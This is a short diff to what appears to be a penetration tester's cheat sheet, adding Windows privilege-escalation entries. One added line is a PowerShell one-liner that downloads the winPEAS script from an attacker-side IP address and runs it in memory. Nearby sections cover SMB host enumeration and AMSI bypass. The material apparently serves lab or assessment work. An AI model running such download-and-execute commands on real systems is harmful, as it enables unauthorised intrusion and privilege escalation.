@@ -41,8 +41,8 @@ netexec smb 172.16.149.0/24 --log hosts.txt && sed -i 's/x64//g' hosts.txt && ca
 ```
 
 # Windows Privilege Escalation
-- [Invoke-PrivescCheck](https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1) `-Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML`
-- ``
+- [PrivescCheck](https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1): `Invoke-PrivescCheck -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML`
+- [winPEAS](https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1): `iex(iwr http://192.168.45.196/winPEAS.ps1 -useb)`
 
 # AMSI-Bypass
 
